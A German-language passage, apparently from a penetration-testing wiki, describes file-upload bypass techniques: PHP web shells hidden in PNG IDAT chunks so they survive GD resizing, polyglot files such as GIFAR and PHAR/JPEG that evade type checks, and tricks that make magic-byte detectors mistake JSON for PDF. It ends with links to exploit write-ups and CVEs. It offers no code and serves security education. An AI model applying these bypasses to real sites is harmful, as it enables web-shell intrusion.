Das Einbetten einer PHP Shell in den IDAT-Chunk einer PNG-Datei kann bestimmte Bildverarbeitungsoperationen effektiv umgehen. Die Funktionen `imagecopyresized` und `imagecopyresampled` aus PHP-GD sind in diesem Zusammenhang besonders relevant, da sie häufig zum Verkleinern bzw. Resampeln von Bildern verwendet werden. Dass die eingebettete PHP Shell von diesen Operationen unberührt bleibt, ist in bestimmten Szenarien ein signifikanter Vorteil.

Eine detaillierte Untersuchung dieser Technik, einschließlich Methodik und möglicher Anwendungen, findet sich im folgenden Artikel: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Diese Ressource bietet ein umfassendes Verständnis des Prozesses und seiner Implikationen.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files dienen in der Cybersicherheit als vielseitiges Werkzeug und agieren wie Chamäleons, die gleichzeitig in mehreren Dateiformaten gültig existieren können. Ein spannendes Beispiel ist ein [GIFAR](https://en.wikipedia.org/wiki/Gifar), ein Hybrid, der sowohl als GIF als auch als RAR-Archiv funktioniert. Solche Dateien beschränken sich nicht auf dieses Paar; Kombinationen wie GIF und JS oder PPT und JS sind ebenfalls möglich.

Der Hauptnutzen von Polyglot files liegt in ihrer Fähigkeit, Sicherheitsmaßnahmen zu umgehen, die Dateien anhand ihres Typs prüfen. Übliche Praxis in vielen Anwendungen ist es, nur bestimmte Dateitypen für Uploads zu erlauben — etwa JPEG, GIF oder DOC — um das Risiko potenziell schädlicher Formate (z. B. JS, PHP oder Phar) zu reduzieren. Ein Polyglot, das die strukturellen Kriterien mehrerer Dateitypen erfüllt, kann diese Einschränkungen jedoch unbemerkt umgehen.

Trotz ihrer Anpassungsfähigkeit stoßen Polyglots auf Grenzen. Beispielsweise kann ein Polyglot gleichzeitig ein PHAR file (PHp ARchive) und ein JPEG sein; der Erfolg des Uploads kann aber von den Richtlinien der Plattform bezüglich Dateiendungen abhängen. Wenn das System strenge Vorgaben zu erlaubten Extensions hat, reicht die strukturelle Dualität eines Polyglots möglicherweise nicht aus, um den Upload sicherzustellen.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Wie man Dateityp-Erkennungen umgeht, indem man eine gültige JSON-Datei hochlädt, auch wenn nicht erlaubt, indem man sie als PDF fälscht (Techniken aus **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Solange die `%PDF` magic bytes in den ersten 1024 Bytes vorhanden sind, gilt die Datei als valide (Beispiel im Post).
- **`pdflib` library**: Füge ein gefälschtes PDF-Format in ein Feld der JSON ein, sodass die Bibliothek denkt, es sei ein PDF (Beispiel im Post).
- **`file` binary**: Es kann bis zu 1048576 Bytes aus einer Datei lesen. Erstelle einfach eine JSON, die größer ist, sodass sie den Inhalt nicht als JSON parsen kann, und füge dann innerhalb der JSON den Anfangsteil eines echten PDF ein — es wird denken, es sei ein PDF.

## Referenzen

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
